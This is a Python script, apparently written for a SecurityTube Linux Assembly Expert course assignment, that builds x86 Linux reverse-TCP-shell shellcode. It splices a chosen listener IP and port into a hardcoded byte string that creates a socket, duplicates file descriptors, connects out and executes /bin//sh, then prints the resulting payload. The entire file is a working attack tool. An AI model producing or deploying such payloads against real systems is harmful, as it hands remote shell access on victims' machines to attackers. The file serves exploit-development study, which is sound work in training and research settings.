#!/usr/bin/python3
'''
Filename:   create_revshell_shellcode.py  
Author:     aus-mate
Purpose:    This code was written for assignment #2 of the SecurityTube Linux Assembly Expert certification.
Student ID: SLAE-1555
'''
import argparse
import socket

shellcode = (b"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd"
             b"\x80\x89\xc3\x31\xc9\xb1\x03\xbe\xfd\xff\xff\xff\x51\x31\xc0\x01\xf1\xb0"
             b"\x3f\xcd\x80\x83\xc6\x02\x59\xe2\xf1\x89\xde\x31\xc0\xb0\x66\x31\xdb\xb3"
             b"\x03\x31\xd2\x68\x7f\x00\x00\x01\x66\x68\x11\x67\x66\x6a\x02\x89\xe2\x6a"
             b"\x10\x52\x56\x89\xe1\xcd\x80\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68"
             b"\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80")

arg = argparse.ArgumentParser(description='Create Reverse TCP Shellcode')
arg.add_argument("ip", help="listener IP")
arg.add_argument("-p", dest="port", required=True, help="listener port")
args = arg.parse_args()

if int(args.port) <= 65535 and int(args.port) >= 0:
    try:
        ip = bytes.fromhex(socket.inet_aton(args.ip).hex())
    except:
        print("Invalid IP address")
        exit()
    print("Creating shellcode...\n")
    bind_port = bytes.fromhex(hex(int(args.port))[2:])
    inst = (b"\x66\x68")
    shellcode_1 = shellcode[0:58]
    shellcode_2 = shellcode[66::]
    final_shellcode = shellcode_1 + ip + inst + bind_port +shellcode_2
    print("\""+"".join("\\x%02x" % i for i in final_shellcode)+"\"")

else:
    print("Invalid port number specified")
